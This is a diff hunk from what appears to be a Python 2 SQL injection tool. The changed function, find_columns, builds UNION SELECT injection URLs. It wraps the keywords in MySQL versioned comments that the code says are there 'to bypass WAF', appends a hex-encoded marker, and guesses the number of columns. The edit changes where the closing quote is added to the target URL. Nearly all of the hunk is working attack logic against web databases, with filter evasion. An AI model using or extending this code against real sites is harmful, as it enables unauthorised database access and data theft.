@@ -112,9 +112,10 @@ def find_columns(target,end_url):
 	union_select = "+AND+'1'='2'+/*!50000union*/+/*!50000select*/+" # to bypass WAF.
 	find_message = "0x"+"L0V3R !N MY@NM@R".encode('hex') # Do not change!
 	column_insert = ','
-	finding_url = target+union_select+find_message
 	if end_url == '--+--':
-		finding_url = target+"'"+union_select+find_message	
+		target = target+"'"
+		# finding_url = target+"'"+union_select+find_message	
+	finding_url = target+union_select+find_message
 	for_finding_columns = target+union_select+str(number_of_column * 111111)
 	print "Finding The Column Numbers in ", target
 	sys.stdout.write("Guessing Columns : ")
